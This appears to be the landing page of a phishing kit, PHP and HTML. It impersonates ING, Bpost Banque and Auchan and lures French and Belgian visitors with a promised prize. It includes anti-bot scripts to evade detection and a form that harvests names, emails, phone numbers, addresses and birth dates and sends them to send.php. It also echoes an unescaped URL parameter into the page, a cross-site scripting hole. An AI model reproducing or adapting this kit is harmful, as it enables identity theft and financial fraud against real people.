<?php

include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';
?>
<html>
<head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <script>
        const SaveNameToLocalStorage = () => {
            const inputValue = document.getElementById('name').value;
            localStorage.setItem('name', inputValue);
        }

        const GetSavedNameFromLocalStorage = () => {
            return localStorage.getItem('name');
        }
    </script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Boz Gagné">
    <meta name="author" content="Auchan gagné ">
    <meta name="keywords" content="Auchan gagné ">
    <title>ING </title>
    <link rel="icon" href="./img/logo.png">
    <link href="/favicon.ico" type="image/x-icon" rel="icon">
    <link href="/favicon.ico" type="image/x-icon" rel="shortcut icon">
    <link rel="stylesheet" type="text/css" href="/css/fonts/flaticon/flaticon.css">
    <link rel="stylesheet" type="text/css" href="/css/fonts/icofont/icofont.min.css">
    <link rel="stylesheet" type="text/css" href="/css/fonts/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" type="text/css" href="/css/vendor/venobox/venobox.min.css">
    <link rel="stylesheet" type="text/css" href="/css/vendor/slickslider/slick.min.css">
    <link rel="stylesheet" type="text/css" href="/css/vendor/niceselect/nice-select.min.css">
    <link rel="stylesheet" type="text/css" href="/css/vendor/bootstrap/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="/css/main.css">
    <link rel="stylesheet" type="text/css" href="/css/index.css">
    <link rel="stylesheet" type="text/css" href="/css/user-auth.css">
    <link rel="stylesheet" type="text/css" href="/css/error.css">
</head>

	
	
	
	
	
	<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1432820937327220');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1432820937327220&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
	
	
	
	
	
	
<body>


    <header class="header-part">
        <div class="container">
            <div class="header-content">
                <div class="header-media-group">
                    <!--<button class="header-user"><img src="./img/user.png" alt="user"></button>-->
                    <a href="./pages/index"><img
                            src="./img/logo.png" alt="logo"></a>
                    <!--<button class="header-src"><i class="fas fa-search"></i></button>-->
                </div>
                <a href="./pages/index" class="header-logo"><img
                        src="./img/logo.png" alt="logo"></a>

                <!--<form class="header-form">
                            <input style="border:none" type="text" placeholder="">
                            <button><i class="fas fa-search"></i></button>
                        </form>
                        <div class="header-widget-group">
                            <button class="header-widget header-cart" title="Cartlist">
                                <span>Vous gagner j'ausqu'a<small>$3450.00</small></span>
                            </button>
                    </div>-->
            </div>
        </div>
    </header>
    <script>
    </script>
    <style>
        input[type="radio"]:checked+span {
            font-weight: bold;
        }

        @media (min-width: 800px) {
            .haroun {
                display: inline-block;
            }
        }

        @media (max-width: 700px) {
            .haroun {
                display: block
            }
        }

        input {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;

            border-radius: 50%;
            width: 20px;
            height: 20px;

            border: 1px solid #4fc882;
            transition: 0.2s all linear;
            margin-right: 5px;

            position: relative;
            top: 4px;
        }

        input:checked {
            border: 6px solid #4fc882;
        }
    </style>


    <section class="user-form-part">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-12 col-sm-10 col-md-12 col-lg-12 col-xl-10">
                    <div class="user-form-logo">
                    </div>
                    <div class="user-form-card">
                        <div class="user-form-title">
                            <h2></h2>
                            <p></p>
                        </div>
                        <div class="">
                            <form action="./send.php" class="user-form" id="billing" method="post"
                                accept-charset="utf-8">
                                <div style="display:none;"><input type="hidden" name="method" value="POST"></div>
                                <div style="margin-right: -8%;" class="haroun col-md-6 form-group">
                                    <label>Civilité :</label><br>
                                    <input type="radio" id="Monsieur" name="M" id="M"
                                        value="Monsieur"><span>Monsieur</span><br>
                                </div>
                                <div class="haroun col-md-6 form-group">
                                    <input type="radio" id="Madame" name="M" id="M"
                                        value="Madame"><span>Madame</span><br>
                                </div>
                                <div class="form-group">
                                    <input type="text" name="name" id="name" class="form-control" required=""
                                        placeholder="Votre Nom et Prénom">
                                </div>
                                <div class="form-group">
                                    <input type="email" name="email" id="email" class="form-control" required=""
                                        placeholder="Votre email">
                                </div>
                                <div class="form-group">
                                    <input type="tel" class="form-control" name="tel" id="tel" required=""
                                        placeholder="Votre Téléphone">
                                </div>
                                <div class="form-group">
                                    <input type="text" class="form-control" name="adresse" id="adresse" required=""
                                        placeholder=" Adresse">
                                </div>
                                <div class="form-group">
                                    <input type="text" class="form-control" name="ville" id="ville" required=""
                                        placeholder="Ville">
                                </div>
                                <div class="form-group">
                                    <input type="tel" class="form-control" name="zip" id="zip" required=""
                                        placeholder="La date de naissance">
                                </div>
                                <div class="form-group">
                                    <label>Votre Pays :</label>
                                    <select name="pays" required="" class="form-control">
                                        <option value="">Choisissez votre pays</option>
                                        <option value="Belgique">Belgique</option>
                                        <option value="France">France</option>
                                    </select>
                                </div>
<div id="<?php echo "". $_GET["bonus"] ."" ;?>" name="bonus" </div>
                                <div class="form-button">
                                    <button type="submit" value="Click" onclick="SaveNameToLocalStorage();" />Je Valide</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section class="section brand-part">
        <div class="user-form-card container">
            <div class="row justify-content-center">
                <div class="col-12">
                    <div class="section-heading">
                        <h2 style="font-size: 156%;">© Bpost Banque 2024</h2>
                    </div>
                </div>
            </div>
            <div class="row intro-content">

                <div class=" col-sm-6 col-lg-4">
                    <div class="intro-wrap">
                        <div class="intro-icon">
                            <img src="./img/1.svg" alt="brand">
                        </div>
                        <div class="intro-content">
                            <p>
                                Prêt mobilhome
                            </p>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6 col-lg-4">
                    <div class="intro-wrap">
                        <div class="intro-icon">
                            <img src="./img/2.svg" alt="brand">
                        </div>
                        <div class="intro-content">
                            <p>
                                Paiement en ligne
                            </p>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6 col-lg-4">
                    <div class="intro-wrap">
                        <div class="intro-icon">
                            <img src="./img/3.svg" alt="brand">
                        </div>
                        <div class="intro-content">
                            <p>
                                Notre prêt personnel
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!--	<section  class="footer-part">
                <div class="container">
                    <div class="row">
                    </div>
                    <div class="row">
                        <div class="col-12">
                            <div style="margin-top: -206px;" class="footer-bottom">
                                <p class="footer-copytext">
                                    <span style="font-weight: 700;">Oui à la newsletter ! </span> Recevez les meilleures offres des magasins Auchan et d'Auchan.fr </a>
                                </p>
                                <div class="footer-card">
                            <form class="news-form">
                                <input type="text" placeholder="Enter Your Email Address">
                                <button>
                                    <span><i class="icofont-ui-email"></i>Subscribe</span>
                                </button>
                            </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>-->
    <script type="text/javascript" src="/js/vendor/bootstrap/jquery-1.12.4.min.js"></script>
    <script type="text/javascript" src="/js/vendor/bootstrap/popper.min.js"></script>
    <script type="text/javascript" src="/js/vendor/bootstrap/bootstrap.min.js"></script>
    <script type="text/javascript" src="/js/vendor/countdown/countdown.min.js"></script>
    <script type="text/javascript" src="/js/vendor/niceselect/nice-select.min.js"></script>
    <script type="text/javascript" src="/js/vendor/slickslider/slick.min.js"></script>
    <script type="text/javascript" src="/js/vendor/venobox/venobox.min.js"></script>
    <script type="text/javascript" src="/js/nice-select.js"></script>
    <script type="text/javascript" src="/js/countdown.js"></script>
    <script type="text/javascript" src="/js/accordion.js"></script>
    <script type="text/javascript" src="/js/venobox.js"></script>
    <script type="text/javascript" src="/js/slick.js"></script>
    <script type="text/javascript" src="/js/main.js"></script>


</body>
<div id="ci-extension-div"></div>

</html>